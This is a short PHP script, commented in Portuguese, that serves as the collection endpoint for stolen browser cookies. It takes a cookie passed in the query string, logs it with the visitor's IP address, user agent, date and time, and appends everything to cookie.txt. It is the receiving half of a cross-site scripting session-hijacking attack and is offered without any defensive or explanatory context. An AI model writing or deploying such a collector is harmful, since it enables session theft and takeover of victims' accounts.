<?php 

	$cookie = $_GET["cookie"];
	$user = $_SERVER["HTTP_USER_AGENT"];
	$ip  = $_SERVER['REMOTE_ADDR'];  //Pegar Ip do Atacante.
	date_default_timezone_set('America/Sao_Paulo');
	$dia_visita = date("d-m-Y");  //Dia da visita
	$horas_visita = date("H:i:s");	//Horario da visita

	$file = fopen("cookie.txt", "a");
	fwrite($file, "IP: $ip || DIA: $dia_visita || HORA: $horas_visita  USER AGENT: $user || COOKIE: $cookie  \n\n");

?>